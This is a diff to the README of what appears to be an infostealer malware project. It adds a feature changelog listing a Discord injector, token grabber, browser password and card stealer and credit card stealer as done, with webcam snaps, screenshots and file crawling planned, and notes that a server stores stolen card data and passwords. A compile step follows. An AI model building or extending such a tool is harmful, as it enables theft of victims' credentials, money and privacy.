@@ -9,6 +9,19 @@ This **IS** being updated so more will be added soon.
 ### What is the server for?
 The server is used to store credit card information and passwords. 
 
+### Change Log / What I want to add
+- [x] Discord Injector
+- [x] Token Grabber & Crawler
+- [x] Browser Card & Password Stealer
+- [ ] Wider Browser Support
+- [ ] Threaded Actions
+- [ ] Dynamic Server Support
+- [x] Credit Card Stealer
+- [ ] Webcam Snap
+- [ ] Desktop Screenshot
+- [ ] File Crawler
+
+
 ## How to compile
 ```bash
 python3 -m pip install pyinstaller
